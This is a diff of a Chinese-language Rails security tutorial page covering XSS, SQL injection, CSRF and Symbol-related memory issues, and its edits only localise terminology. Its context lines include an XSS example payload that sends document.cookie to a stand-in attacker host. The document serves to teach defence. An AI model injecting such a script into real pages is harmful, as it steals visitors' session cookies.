@@ -37,7 +37,7 @@
   <p>If you’re the smartest person in the room, you’re in the wrong room. - Unknown</p>
 </blockquote>
 
-<p>一旦你的网站要放到网际网络上，你就得接受被骇客攻击的风险，小则倒站，大则使用者资料被窃取。而从网络设备、作业系统、网站服务器、数据库到应用程式，有高达<em>75%</em>的攻击主要都发生在网站应用程式这一层，因此身为网站开发者的你，对于网络安全不能没有基本的认识。</p>
+<p>一旦你的网站要放到网际网络上，你就得接受被骇客攻击的风险，小则倒站，大则使用者资料被窃取。而从网络设备、作业系统、网站服务器、数据库到应用程序，有高达<em>75%</em>的攻击主要都发生在网站应用程序这一层，因此身为网站开发者的你，对于网络安全不能没有基本的认识。</p>
 
 <p>所幸<em>Rails</em>本身就内建了许多安全机制，像是<em>SQL injection</em>、<em>XSS</em>和<em>CSRF</em>等，可以帮助我们防范常见的数种网络攻击，这一章会介绍几个网络安全上的防范重点。</p>
 
@@ -64,7 +64,7 @@
 &lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;
 </code></pre>
 
-<p>当一般使用者浏览到这一页时，就会跳出<em>alert</em>视窗，或是将敏感资料例如<em>cookie</em>内容传给攻击者。</p>
+<p>当一般使用者浏览到这一页时，就会跳出<em>alert</em>窗口，或是将敏感资料例如<em>cookie</em>内容传给攻击者。</p>
 
 <p>要防范这个问题的方法，就是要逸出使用者输入的内容，例如将<code>&lt;script&gt;</code>变成<code>&amp;lt;script&amp;gt;</code>，使之显示出来的时候不让浏览器去执行。你可以会想只要逸出<code>&lt;script&gt;</code>就好了吧？这就错了，请千万不要尝试建立黑名单过滤，你可以参观<em><a href="http://ha.ckers.org/xss.html">XSS  Cheat Sheet</a></em>这个网站，就会知道有非常多形式可以让浏览器去执行脚本程式。因此最简单又保险的方式，就是全部逸出。这在<em>Rails 3</em>版本已经变成预设行为，任何<em>View</em>样本的字串，都会做<em>HTML</em>溢出。</p>
 
@@ -240,7 +240,7 @@ end
 
 <h2 id="symbolize-">Symbolize 问题</h2>
 
-<p><em>symbol</em>是<em>Ruby</em>中常用的型态，相较于字串可以获得更好的执行效率，其占用内存较少，但其特性是不会被<em>GC(garbage collection)</em>内存回收的。因此只适合程式内部有限的情况中使用，而不要将使用者可以任意输入的参数做<em>symbol</em>化，例如：</p>
+<p><em>symbol</em>是<em>Ruby</em>中常用的类型，相较于字串可以获得更好的执行效率，其占用内存较少，但其特性是不会被<em>GC(garbage collection)</em>内存回收的。因此只适合程式内部有限的情况中使用，而不要将使用者可以任意输入的参数做<em>symbol</em>化，例如：</p>
 
 <pre><code>if params[:category].to_sym == :first # 此例直接比较字串即可 params[:category] == "first"
    # do something
